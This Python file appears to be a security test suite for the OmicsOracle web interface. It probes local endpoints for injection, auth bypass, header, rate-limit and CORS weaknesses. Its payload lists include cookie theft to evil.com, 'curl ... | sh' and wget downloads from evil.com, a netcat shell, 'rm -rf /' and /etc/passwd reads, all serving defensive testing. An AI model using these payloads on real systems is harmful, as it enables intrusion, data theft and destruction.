#!/usr/bin/env python3
"""
Security Testing Suite for OmicsOracle Web Interface

This module provides comprehensive security testing including injection attacks,
input validation, and vulnerability scanning.
"""

import asyncio
import json
import logging
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Tuple

import aiohttp

logger = logging.getLogger(__name__)


class SecurityTester:
    """Comprehensive security testing suite for web interface."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.injection_payloads = self._load_injection_payloads()
        self.test_results: Dict[str, Any] = {}

    def _load_injection_payloads(self) -> Dict[str, List[str]]:
        """Load various injection attack payloads."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users--",
                "'; INSERT INTO users VALUES ('hacker','password'); --",
                "' OR 1=1 --",
                "' UNION SELECT version() --",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src='javascript:alert(`XSS`)'></iframe>",
                "<body onload=alert('XSS')>",
                "<div onclick='alert(\"XSS\")'>Click me</div>",
                "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
                "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "`id`",
                "$(id)",
                "; rm -rf /",
                "| nc -l -p 1234 -e /bin/sh",
                "&& curl http://evil.com/malware.sh | sh",
                "; wget http://evil.com/backdoor.php",
                "$(curl -s http://evil.com/payload)",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd",
                "....\\\\....\\\\....\\\\etc\\\\passwd",
            ],
            "nosql_injection": [
                "{'$ne': null}",
                "{'$gt': ''}",
                "{'$where': 'this.username == this.password'}",
                "'; return db.users.find(); var dummy=''",
                "{'$regex': '.*'}",
                "{'$exists': true}",
                "{'$not': {'$size': 0}}",
                "'; db.users.drop(); var x='",
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))%00",
                "*()|%26'",
                "*)(&(objectClass=*)",
                "*)(objectClass=*)(uid=*))(|(uid=*",
            ],
        }

    async def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """Run all security tests and return comprehensive results."""
        logger.info("Starting comprehensive security testing")

        test_suites = [
            ("Input Validation", self.test_input_validation),
            ("Authentication Security", self.test_authentication_security),
            ("Session Management", self.test_session_management),
            ("Security Headers", self.test_security_headers),
            ("Rate Limiting", self.test_rate_limiting),
            ("Error Handling", self.test_error_disclosure),
            ("File Upload Security", self.test_file_upload_security),
            ("CORS Configuration", self.test_cors_configuration),
        ]

        results = {
            "test_summary": {
                "start_time": datetime.now().isoformat(),
                "total_tests": len(test_suites),
                "passed_tests": 0,
                "failed_tests": 0,
                "security_score": 0,
            },
            "detailed_results": {},
        }

        for test_name, test_function in test_suites:
            logger.info(f"Running {test_name} tests...")
            try:
                test_result = await test_function()
                results["detailed_results"][test_name] = test_result

                # Calculate pass/fail
                if test_result.get("overall_status") == "PASS":
                    results["test_summary"]["passed_tests"] += 1
                else:
                    results["test_summary"]["failed_tests"] += 1

            except Exception as e:
                logger.error(f"Error in {test_name}: {e}")
                results["detailed_results"][test_name] = {
                    "error": str(e),
                    "overall_status": "ERROR",
                }
                results["test_summary"]["failed_tests"] += 1

        # Calculate security score
        total_tests = results["test_summary"]["passed_tests"] + results["test_summary"]["failed_tests"]
        if total_tests > 0:
            results["test_summary"]["security_score"] = (
                results["test_summary"]["passed_tests"] / total_tests
            ) * 100

        results["test_summary"]["end_time"] = datetime.now().isoformat()
        return results

    async def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation against various injection attacks."""
        results = {
            "test_description": "Input validation and injection testing",
            "vulnerabilities_found": [],
            "tests_performed": 0,
            "passed_tests": 0,
            "attack_results": {},
        }

        # Test search API endpoint
        search_endpoint = "/api/search"

        for attack_type, payloads in self.injection_payloads.items():
            attack_results = []

            for payload in payloads:
                results["tests_performed"] += 1

                # Test different parameters
                test_cases = [
                    {"query": payload, "max_results": 10},
                    {"query": "diabetes", "max_results": payload},
                    {"query": payload, "organism": payload},
                    {"query": "test", "organism": payload},
                ]

                for test_case in test_cases:
                    vulnerability = await self._test_injection_payload(
                        search_endpoint, test_case, payload, attack_type
                    )

                    if vulnerability:
                        results["vulnerabilities_found"].append(vulnerability)
                        attack_results.append(vulnerability)
                    else:
                        results["passed_tests"] += 1

            results["attack_results"][attack_type] = attack_results

        # Test AI summarization endpoint
        ai_endpoint = "/api/ai/summarize"
        ai_test_cases = [
            {"query": payload, "max_results": 5, "include_batch_summary": True}
            for payload in self.injection_payloads["xss_payloads"][:5]  # Test top XSS payloads
        ]

        for test_case in ai_test_cases:
            results["tests_performed"] += 1
            vulnerability = await self._test_injection_payload(
                ai_endpoint, test_case, test_case["query"], "xss_in_ai"
            )

            if vulnerability:
                results["vulnerabilities_found"].append(vulnerability)
            else:
                results["passed_tests"] += 1

        # Determine overall status
        results["overall_status"] = "PASS" if len(results["vulnerabilities_found"]) == 0 else "FAIL"
        results["vulnerability_count"] = len(results["vulnerabilities_found"])

        return results

    async def _test_injection_payload(
        self, endpoint: str, test_case: Dict, payload: str, attack_type: str
    ) -> Dict[str, Any]:
        """Test a specific injection payload against an endpoint."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(f"{self.base_url}{endpoint}", json=test_case, timeout=10) as response:
                    response_text = await response.text()

                    # Check for signs of successful injection
                    vulnerability_indicators = {
                        "sql_injection": [
                            "SQL syntax",
                            "mysql error",
                            "ORA-",
                            "Microsoft OLE DB",
                            "ERROR:",
                            "Warning:",
                            "mysql_fetch",
                            "PostgreSQL",
                        ],
                        "xss_payloads": [
                            "<script",
                            "javascript:",
                            "onerror=",
                            "onload=",
                            "alert(",
                        ],
                        "command_injection": [
                            "uid=",
                            "gid=",
                            "root:",
                            "/etc/passwd",
                            "Directory of",
                            "volume serial number",
                        ],
                        "path_traversal": [
                            "root:x:",
                            "[boot loader]",
                            "etc/passwd",
                            "system32",
                        ],
                    }

                    indicators = vulnerability_indicators.get(attack_type, [])

                    for indicator in indicators:
                        if indicator.lower() in response_text.lower():
                            return {
                                "endpoint": endpoint,
                                "payload": payload,
                                "attack_type": attack_type,
                                "test_case": test_case,
                                "response_status": response.status,
                                "vulnerability_indicator": indicator,
                                "response_preview": response_text[:200],
                                "severity": self._assess_vulnerability_severity(attack_type, indicator),
                            }

                    # Check for error disclosure
                    if self._check_error_disclosure(response_text):
                        return {
                            "endpoint": endpoint,
                            "payload": payload,
                            "attack_type": "error_disclosure",
                            "test_case": test_case,
                            "response_status": response.status,
                            "vulnerability_indicator": "Sensitive error information disclosed",
                            "response_preview": response_text[:200],
                            "severity": "MEDIUM",
                        }

                    # Check if payload is reflected in response (potential XSS)
                    if payload in response_text and attack_type in [
                        "xss_payloads",
                        "xss_in_ai",
                    ]:
                        return {
                            "endpoint": endpoint,
                            "payload": payload,
                            "attack_type": "reflected_xss",
                            "test_case": test_case,
                            "response_status": response.status,
                            "vulnerability_indicator": "Payload reflected in response",
                            "response_preview": response_text[:200],
                            "severity": "HIGH",
                        }

        except Exception as e:
            logger.error(f"Error testing payload {payload}: {e}")

        return None

    def _check_error_disclosure(self, response_text: str) -> bool:
        """Check if response exposes sensitive information."""
        sensitive_patterns = [
            r"traceback.*?error",
            r"exception.*?line \d+",
            r"stack trace",
            r"internal server error.*?at line",
            r"database.*?error",
            r"connection.*?refused",
            r"access.*?denied.*?for user",
            r"password.*?authentication.*?failed",
            r"file.*?not found.*?/usr/",
            r"permission.*?denied.*?/var/",
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return True

        return False

    def _assess_vulnerability_severity(self, attack_type: str, indicator: str) -> str:
        """Assess the severity of a discovered vulnerability."""
        high_severity = ["sql_injection", "command_injection", "reflected_xss"]
        medium_severity = ["path_traversal", "nosql_injection"]

        if attack_type in high_severity:
            return "HIGH"
        elif attack_type in medium_severity:
            return "MEDIUM"
        else:
            return "LOW"

    async def test_authentication_security(self) -> Dict[str, Any]:
        """Test authentication bypass and security."""
        results = {
            "test_description": "Authentication and authorization security",
            "tests_performed": 0,
            "vulnerabilities_found": [],
            "bypass_attempts": [],
        }

        # Test common authentication bypass techniques
        bypass_tests = [
            # Header manipulation
            {
                "headers": {"X-User-ID": "admin"},
                "description": "X-User-ID header injection",
            },
            {
                "headers": {"Authorization": "Bearer fake_token"},
                "description": "Fake JWT token",
            },
            {
                "headers": {"X-Admin": "true"},
                "description": "X-Admin header injection",
            },
            {
                "headers": {"X-Forwarded-User": "administrator"},
                "description": "X-Forwarded-User injection",
            },
            # Parameter manipulation
            {
                "params": {"admin": "true"},
                "description": "Admin parameter injection",
            },
            {
                "params": {"role": "administrator"},
                "description": "Role escalation",
            },
            {
                "params": {"user_id": "1' OR '1'='1"},
                "description": "SQL injection in user_id",
            },
            {"params": {"debug": "1"}, "description": "Debug mode activation"},
        ]

        # Test against potentially protected endpoints
        protected_endpoints = [
            "/api/admin/status",
            "/api/config",
            "/api/debug",
            "/admin",
            "/api/users",
            "/api/system",
        ]

        async with aiohttp.ClientSession() as session:
            for endpoint in protected_endpoints:
                for test in bypass_tests:
                    results["tests_performed"] += 1

                    try:
                        # Test with bypass attempt
                        async with session.get(
                            f"{self.base_url}{endpoint}",
                            headers=test.get("headers", {}),
                            params=test.get("params", {}),
                            timeout=10,
                        ) as response:
                            bypass_result = {
                                "endpoint": endpoint,
                                "test": test["description"],
                                "status_code": response.status,
                                "bypassed": response.status == 200,
                                "response_length": len(await response.text()),
                            }

                            results["bypass_attempts"].append(bypass_result)

                            if response.status == 200:
                                results["vulnerabilities_found"].append(
                                    {
                                        "type": "authentication_bypass",
                                        "endpoint": endpoint,
                                        "method": test["description"],
                                        "severity": "HIGH",
                                    }
                                )

                    except Exception as e:
                        results["bypass_attempts"].append(
                            {
                                "endpoint": endpoint,
                                "test": test["description"],
                                "error": str(e),
                            }
                        )

        results["overall_status"] = "PASS" if len(results["vulnerabilities_found"]) == 0 else "FAIL"
        return results

    async def test_security_headers(self) -> Dict[str, Any]:
        """Test security headers configuration."""
        results = {
            "test_description": "Security headers validation",
            "missing_headers": [],
            "present_headers": [],
            "header_analysis": {},
        }

        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=",
            "Content-Security-Policy": "default-src",
            "Referrer-Policy": [
                "strict-origin-when-cross-origin",
                "no-referrer",
                "same-origin",
            ],
            "Permissions-Policy": "geolocation=",
            "Cache-Control": "no-cache",
        }

        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.base_url}/") as response:
                headers = response.headers

                for header, expected in required_headers.items():
                    if header in headers:
                        header_value = headers[header]
                        results["present_headers"].append(header)

                        if isinstance(expected, list):
                            valid = any(exp in header_value for exp in expected)
                        else:
                            valid = expected in header_value

                        results["header_analysis"][header] = {
                            "present": True,
                            "value": header_value,
                            "valid": valid,
                            "expected": expected,
                        }
                    else:
                        results["missing_headers"].append(header)
                        results["header_analysis"][header] = {
                            "present": False,
                            "valid": False,
                            "expected": expected,
                        }

        # Check HTTPS configuration if applicable
        if self.base_url.startswith("https://"):
            results["https_analysis"] = await self._test_https_configuration()

        # Overall assessment
        critical_missing = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Content-Security-Policy",
        ]
        has_critical_missing = any(header in results["missing_headers"] for header in critical_missing)

        results["overall_status"] = "FAIL" if has_critical_missing else "PASS"
        results["security_score"] = (
            (len(required_headers) - len(results["missing_headers"])) / len(required_headers)
        ) * 100

        return results

    async def _test_https_configuration(self) -> Dict[str, Any]:
        """Test HTTPS/SSL configuration."""
        # This would require SSL-specific testing libraries
        # For now, we'll do basic checks
        return {
            "https_enabled": self.base_url.startswith("https://"),
            "hsts_header": "Strict-Transport-Security" in self.test_results.get("headers", {}),
            "secure_cookies": True,  # Would need to check Set-Cookie headers
        }

    async def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting implementation."""
        results = {
            "test_description": "Rate limiting validation",
            "requests_made": 0,
            "rate_limited_at": None,
            "rate_limiting_active": False,
            "response_analysis": [],
        }

        # Rapid requests to test rate limiting
        async with aiohttp.ClientSession() as session:
            for i in range(50):  # 50 rapid requests
                try:
                    start_time = asyncio.get_event_loop().time()
                    async with session.post(
                        f"{self.base_url}/api/search",
                        json={"query": f"test{i}", "max_results": 1},
                        timeout=5,
                    ) as response:
                        duration = asyncio.get_event_loop().time() - start_time
                        results["requests_made"] += 1

                        response_info = {
                            "request_num": i,
                            "status_code": response.status,
                            "response_time": duration,
                            "rate_limited": response.status == 429,
                            "headers": dict(response.headers),
                        }

                        results["response_analysis"].append(response_info)

                        if response.status == 429 and results["rate_limited_at"] is None:
                            results["rate_limited_at"] = i
                            results["rate_limiting_active"] = True
                            break  # Rate limiting working, no need to continue

                except Exception as e:
                    results["response_analysis"].append({"request_num": i, "error": str(e)})

        # Analyze rate limiting effectiveness
        if results["rate_limiting_active"]:
            results["overall_status"] = "PASS"
            results["rate_limit_threshold"] = results["rate_limited_at"]
        else:
            results["overall_status"] = "FAIL"
            results["recommendation"] = "Implement rate limiting to prevent abuse"

        return results

    async def test_error_disclosure(self) -> Dict[str, Any]:
        """Test for sensitive information disclosure in error messages."""
        results = {
            "test_description": "Error disclosure and information leakage",
            "information_leaks": [],
            "tests_performed": 0,
        }

        # Test various error conditions
        error_test_cases = [
            ("/nonexistent-endpoint", "GET", {}, "404 error disclosure"),
            (
                "/api/search",
                "POST",
                {"invalid": "data"},
                "Invalid request data",
            ),
            ("/api/search", "POST", {}, "Missing required fields"),
            (
                "/api/ai/summarize",
                "POST",
                {"query": "x" * 10000},
                "Oversized request",
            ),
            ("/api/search", "PUT", {"query": "test"}, "Invalid HTTP method"),
        ]

        async with aiohttp.ClientSession() as session:
            for endpoint, method, data, test_description in error_test_cases:
                results["tests_performed"] += 1

                try:
                    if method == "GET":
                        async with session.get(f"{self.base_url}{endpoint}", timeout=10) as response:
                            response_text = await response.text()
                    else:
                        async with session.request(
                            method,
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10,
                        ) as response:
                            response_text = await response.text()

                    # Check for information disclosure
                    if self._check_error_disclosure(response_text):
                        results["information_leaks"].append(
                            {
                                "test": test_description,
                                "endpoint": endpoint,
                                "method": method,
                                "status_code": response.status,
                                "leaked_info": response_text[:300],
                                "severity": "MEDIUM",
                            }
                        )

                except Exception as e:
                    # Even exceptions might reveal information
                    if "connection" in str(e).lower() or "timeout" in str(e).lower():
                        pass  # Normal network errors
                    else:
                        results["information_leaks"].append(
                            {
                                "test": test_description,
                                "endpoint": endpoint,
                                "method": method,
                                "exception": str(e),
                                "severity": "LOW",
                            }
                        )

        results["overall_status"] = "PASS" if len(results["information_leaks"]) == 0 else "FAIL"
        return results

    async def test_session_management(self) -> Dict[str, Any]:
        """Test session management security."""
        results = {
            "test_description": "Session management security",
            "session_vulnerabilities": [],
        }

        # Test session-related security
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.base_url}/") as response:
                # Check for secure session cookies
                set_cookies = response.headers.getall("Set-Cookie", [])

                for cookie in set_cookies:
                    cookie_analysis = {
                        "cookie": cookie,
                        "secure": "Secure" in cookie,
                        "httponly": "HttpOnly" in cookie,
                        "samesite": "SameSite" in cookie,
                    }

                    if not cookie_analysis["secure"] and self.base_url.startswith("https://"):
                        results["session_vulnerabilities"].append(
                            {
                                "type": "insecure_cookie",
                                "description": "Cookie missing Secure flag on HTTPS",
                                "severity": "MEDIUM",
                            }
                        )

                    if not cookie_analysis["httponly"]:
                        results["session_vulnerabilities"].append(
                            {
                                "type": "missing_httponly",
                                "description": "Cookie missing HttpOnly flag",
                                "severity": "MEDIUM",
                            }
                        )

        results["overall_status"] = "PASS" if len(results["session_vulnerabilities"]) == 0 else "FAIL"
        return results

    async def test_file_upload_security(self) -> Dict[str, Any]:
        """Test file upload security (if endpoints exist)."""
        results = {
            "test_description": "File upload security testing",
            "upload_endpoints_found": [],
            "vulnerabilities": [],
        }

        # Check for file upload endpoints
        potential_upload_endpoints = [
            "/api/upload",
            "/upload",
            "/api/import",
            "/api/files",
            "/files/upload",
        ]

        async with aiohttp.ClientSession() as session:
            for endpoint in potential_upload_endpoints:
                try:
                    async with session.options(f"{self.base_url}{endpoint}") as response:
                        if response.status != 404:
                            results["upload_endpoints_found"].append(endpoint)
                except:
                    pass

        # If no upload endpoints found, mark as pass
        if not results["upload_endpoints_found"]:
            results["overall_status"] = "PASS"
            results["note"] = "No file upload endpoints found"
        else:
            results["overall_status"] = "NEEDS_MANUAL_TESTING"
            results["note"] = "File upload endpoints found but require manual testing"

        return results

    async def test_cors_configuration(self) -> Dict[str, Any]:
        """Test CORS configuration."""
        results = {
            "test_description": "CORS configuration testing",
            "cors_headers": {},
            "vulnerabilities": [],
        }

        async with aiohttp.ClientSession() as session:
            # Test preflight request
            headers = {
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            }

            async with session.options(f"{self.base_url}/api/search", headers=headers) as response:
                cors_headers = {
                    key: value
                    for key, value in response.headers.items()
                    if key.lower().startswith("access-control-")
                }

                results["cors_headers"] = cors_headers

                # Check for overly permissive CORS
                allow_origin = cors_headers.get("Access-Control-Allow-Origin", "")
                if allow_origin == "*":
                    results["vulnerabilities"].append(
                        {
                            "type": "permissive_cors",
                            "description": "CORS allows all origins (*)",
                            "severity": "MEDIUM",
                        }
                    )

                allow_credentials = cors_headers.get("Access-Control-Allow-Credentials", "").lower()
                if allow_credentials == "true" and allow_origin == "*":
                    results["vulnerabilities"].append(
                        {
                            "type": "cors_credentials_wildcard",
                            "description": "CORS allows credentials with wildcard origin",
                            "severity": "HIGH",
                        }
                    )

        results["overall_status"] = "PASS" if len(results["vulnerabilities"]) == 0 else "FAIL"
        return results

    async def save_security_report(
        self,
        results: Dict[str, Any],
        filename: str = "security_test_results.json",
    ) -> None:
        """Save security test results to file."""
        results_file = Path(__file__).parent.parent.parent / filename

        with open(results_file, "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info(f"Security test results saved to {results_file}")

        # Also create a summary report
        await self._generate_security_summary(results, results_file.with_suffix(".md"))

    async def _generate_security_summary(self, results: Dict[str, Any], summary_file: Path) -> None:
        """Generate a human-readable security summary."""
        summary = []
        summary.append("# OmicsOracle Security Test Report\n")
        summary.append(f"**Test Date:** {results['test_summary']['start_time']}\n")
        summary.append(f"**Security Score:** {results['test_summary']['security_score']:.1f}%\n")
        summary.append(
            f"**Tests Passed:** {results['test_summary']['passed_tests']}/{results['test_summary']['total_tests']}\n\n"
        )

        summary.append("## Test Results Summary\n")

        for test_name, test_result in results["detailed_results"].items():
            status = test_result.get("overall_status", "UNKNOWN")
            emoji = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️"
            summary.append(f"- {emoji} **{test_name}**: {status}\n")

        summary.append("\n## Vulnerabilities Found\n")

        high_vulns = []
        medium_vulns = []
        low_vulns = []

        for test_result in results["detailed_results"].values():
            vulns = test_result.get("vulnerabilities_found", [])
            for vuln in vulns:
                severity = vuln.get("severity", "UNKNOWN")
                if severity == "HIGH":
                    high_vulns.append(vuln)
                elif severity == "MEDIUM":
                    medium_vulns.append(vuln)
                else:
                    low_vulns.append(vuln)

        if high_vulns:
            summary.append(f"### 🚨 High Severity ({len(high_vulns)})\n")
            for vuln in high_vulns:
                summary.append(
                    f"- **{vuln.get('type', 'Unknown')}**: {vuln.get('description', 'No description')}\n"
                )

        if medium_vulns:
            summary.append(f"### ⚠️ Medium Severity ({len(medium_vulns)})\n")
            for vuln in medium_vulns:
                summary.append(
                    f"- **{vuln.get('type', 'Unknown')}**: {vuln.get('description', 'No description')}\n"
                )

        if low_vulns:
            summary.append(f"### ℹ️ Low Severity ({len(low_vulns)})\n")
            for vuln in low_vulns:
                summary.append(
                    f"- **{vuln.get('type', 'Unknown')}**: {vuln.get('description', 'No description')}\n"
                )

        if not (high_vulns or medium_vulns or low_vulns):
            summary.append("✅ No significant vulnerabilities found!\n")

        summary.append("\n## Recommendations\n")
        summary.append("- Review and address any high severity vulnerabilities immediately\n")
        summary.append("- Implement missing security headers\n")
        summary.append("- Ensure proper input validation on all endpoints\n")
        summary.append("- Regular security testing should be part of CI/CD pipeline\n")

        with open(summary_file, "w") as f:
            f.writelines(summary)


async def main():
    """Run comprehensive security testing."""
    print("🔒 Starting Comprehensive Security Testing")
    print("=" * 50)

    tester = SecurityTester()

    # Run all security tests
    results = await tester.run_comprehensive_security_test()

    # Save results
    await tester.save_security_report(results)

    # Print summary
    print(f"\n📊 Security Test Summary:")
    print(f"Security Score: {results['test_summary']['security_score']:.1f}%")
    print(f"Tests Passed: {results['test_summary']['passed_tests']}/{results['test_summary']['total_tests']}")

    total_vulns = sum(
        len(test.get("vulnerabilities_found", [])) for test in results["detailed_results"].values()
    )
    print(f"Vulnerabilities Found: {total_vulns}")

    if results["test_summary"]["security_score"] >= 80:
        print("✅ Security testing passed - system appears secure")
    else:
        print("⚠️ Security issues detected - review results and fix vulnerabilities")


if __name__ == "__main__":
    asyncio.run(main())
